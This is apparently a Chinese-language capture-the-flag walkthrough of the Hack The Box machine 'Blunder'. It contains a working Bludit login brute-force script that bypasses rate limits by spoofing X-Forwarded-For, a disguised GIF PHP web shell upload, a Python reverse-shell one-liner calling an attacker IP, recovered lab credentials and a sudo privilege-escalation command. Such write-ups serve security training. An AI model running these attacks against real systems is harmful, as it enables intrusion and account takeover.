# Blunder\_191

![image-20200917085411234](assets/Blunder_191.assets/image-20200917085411234.png)

只开了80一个端口

![image-20200626081654031](assets/Blunder_191.assets/image-20200626081654031.png)

![image-20200626094051228](assets/Blunder_191.assets/image-20200626094051228.png)

![image-20200626094016377](assets/Blunder_191.assets/image-20200626094016377.png)

robots.txt

![image-20200626094455402](assets/Blunder_191.assets/image-20200626094455402.png)

![image-20200626094425214](assets/Blunder_191.assets/image-20200626094425214.png)

似乎是后台登录页面。

![image-20200626094126497](assets/Blunder_191.assets/image-20200626094126497.png)

![image-20200626094715869](assets/Blunder_191.assets/image-20200626094715869.png)

[https://www.exploit-db.com/exploits/48568](https://www.exploit-db.com/exploits/48568)

![image-20200626095130450](assets/Blunder_191.assets/image-20200626095130450.png)

![image-20200626095233595](assets/Blunder_191.assets/image-20200626095233595.png)

虽然存在一个漏洞利用方法，但是明显需要有效凭证。

浏览了打出来的很多页面，但是没有更多信息了。

尝试fuzz根目录下的文件，看看是否有更多线索。

```bash
wfuzz -c -w /usr/share/seclists/Discovery/Web-Content/big.txt -z list,txt-php-html -u http://10.10.10.191/FUZZ.FUZ2Z --hc 404,403 -t 100
```

![image-20200626093421355](assets/Blunder_191.assets/image-20200626093421355.png)

![image-20200626094625579](assets/Blunder_191.assets/image-20200626094625579.png)

CMS刚升级完，估计不存在漏洞利用。

让通知`fergus`新博客需要图片，那这个人可能是网站管理员。

看来我们拥有用户名和登录页面，剩下就是暴力破解了。

抓登录包分析

![image-20200626095651081](assets/Blunder_191.assets/image-20200626095651081.png)

有token，常用暴力工具显然无法成功。google了一下发现了一个暴力脚本

[https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/blob/master/bruteforce.py](https://github.com/musyoka101/Bludit-CMS-Version-3.9.2-Brute-Force-Protection-Bypass-script/blob/master/bruteforce.py)

修改已符合我们当前情况

```python
#!/usr/bin/env python3
import re
import requests

host = "http://10.10.10.191" # change to the appropriate URL

login_url = host + '/admin/login'
username = 'fergus' # Change to the appropriate username
fname = "wordlist.txt" #change this to the appropriate file you can specify the full path to the file
with open(fname) as f:
    content = f.readlines()
    word1 = [x.strip() for x in content] 
wordlist = word1

for password in wordlist:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

![image-20200626122804028](assets/Blunder_191.assets/image-20200626122804028.png)

![image-20200626123151467](assets/Blunder_191.assets/image-20200626123151467.png)

```bash
fergus:RolandDeschain
```

成功登录

![image-20200626123606219](assets/Blunder_191.assets/image-20200626123606219.png)

制作一个伪造的gif cmd shell，并上传

```bash
vim gif_shell.gif
```

![image-20200626125008147](assets/Blunder_191.assets/image-20200626125008147.png)

![image-20200626124037477](assets/Blunder_191.assets/image-20200626124037477.png)

![image-20200626124921379](assets/Blunder_191.assets/image-20200626124921379.png)

我们伪造的后缀是gif，在上传时使用bp进行抓包，修改文件名后缀为php

![image-20200626124604872](assets/Blunder_191.assets/image-20200626124604872.png)

验证

```bash
http://10.10.10.191/bl-content/tmp/gif_shell.php?cmd=id
```

![image-20200626124743230](assets/Blunder_191.assets/image-20200626124743230.png)

执行命令，在1337端口监听以获得rshell

```bash
http://10.10.10.191/bl-content/tmp/gif_shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.189",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

![image-20200626125622567](assets/Blunder_191.assets/image-20200626125622567.png)

经过一些搜寻枚举后发现

![image-20200626125827707](assets/Blunder_191.assets/image-20200626125827707.png)

```bash
hugo:faca404fd5c0a31cf1897b823c695c85cffeb98d
```

![image-20200626125951359](assets/Blunder_191.assets/image-20200626125951359.png)

```bash
hugo:Password120
```

直接切换用户

![image-20200626130223106](assets/Blunder_191.assets/image-20200626130223106.png)

切换后的提权极为简单，`!root`参数，这种情况一句话即可提权`sudo -u#-1 /bin/bash`

参考[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

先拿user.txt

![image-20200626130544741](assets/Blunder_191.assets/image-20200626130544741.png)

提权

![image-20200626130810969](assets/Blunder_191.assets/image-20200626130810969.png)

![image-20200626130950190](assets/Blunder_191.assets/image-20200626130950190.png)

